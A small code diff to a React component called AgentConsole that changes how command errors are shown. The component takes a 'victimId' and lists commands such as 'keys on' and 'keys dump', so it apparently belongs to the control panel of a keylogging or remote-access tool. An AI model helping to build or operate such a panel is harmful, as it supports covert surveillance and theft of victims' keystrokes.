@@ -10,6 +10,7 @@ import { Empty, SkeletonRows } from '@/components/ui/table';
 import { Badge } from '@/components/ui/badge';
 import type { Task } from '@/lib/types';
 import { dateTime } from '@/lib/format';
+import { humanError } from '@/lib/errors';
 
 const COMMANDS = [
   'help', 'ops', 'status', 'ping', 'ls', 'keys status', 'keys on', 'keys off --hard', 'keys dump',
@@ -68,7 +69,7 @@ export function AgentConsole({ victimId }: { victimId: string }) {
       setCursor(-1);
       refresh();
     } catch (caught) {
-      toast.error(caught instanceof Error ? caught.message : 'command failed');
+      toast.error(humanError(caught) || 'command failed');
     } finally {
       setBusy(false);
     }
